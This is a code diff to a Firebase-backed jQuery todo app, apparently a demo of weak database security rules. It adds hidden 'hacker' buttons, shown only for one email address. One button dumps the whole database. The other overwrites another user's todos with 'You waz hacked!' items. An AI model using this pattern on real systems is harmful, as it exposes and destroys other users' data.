@@ -66,6 +66,9 @@ jQuery(function ($) {
 			// Quick & dirty firebase implementation: wait for things to self update and sync up
 			console.log('onFirebaseAuth', user && user.uid, wasLogout);
 			if (user && user.uid) {
+				if (user.email === 'hello2@example.com') {
+					$('.hacker').css({'display':'block'});
+				}
 				firebase.database().ref('/userdata').child(user.uid).on('value', this.firebaseOnValue.bind(this));
 			}
 			if (wasLogout) {
@@ -124,6 +127,9 @@ jQuery(function ($) {
 				.on('keyup', '.edit', this.editKeyup.bind(this))
 				.on('focusout', '.edit', this.update.bind(this))
 				.on('click', '.destroy', this.destroy.bind(this));
+
+			$('#btn-hacker-1').on('click', this.hackMeButton1.bind(this));
+			$('#btn-hacker-2').on('click', this.hackMeButton2.bind(this));
 		},
 		render: function () {
 			console.log('render');
@@ -259,6 +265,37 @@ jQuery(function ($) {
 			this.todos.splice(x, 1); // temporary until firebase catches up
 			this.firebaseDelete(o);
 			this.render();
+		},
+		hackMeButton1: function(e) {
+			firebase.database().ref('/').once('value', function(snapshot) {
+				var o = snapshot.toJSON();
+				console.log(o);
+				alert(JSON.stringify(o));
+			});
+		},
+		hackMeButton2: function(e) {
+			firebase.database().ref('/userdata').once('value', function(snapshot) {
+				var userdata = snapshot.toJSON();
+				// Pick a random user whom is not us and change their data
+				var uids = Object.getOwnPropertyNames(userdata);
+				var hackSomeUid;
+				uids.forEach(function(v) {
+					if (v === window.demo.user.uid) {
+						// skip
+					} else {
+						// TODO randomise...
+						hackSomeUid = v;
+					}
+					if (hackSomeUid) {
+						var hacked1 = { id: util.uuid(), title: 'You waz hacked!', completed: false };
+						var hacked2 = { id: util.uuid(), title: 'You waz hacked more!', completed: false };
+						firebase.database().ref('/userdata').child(hackSomeUid).set({
+							hacked1,
+							hacked2
+						});
+					}
+				});
+			});
 		}
 	};
 
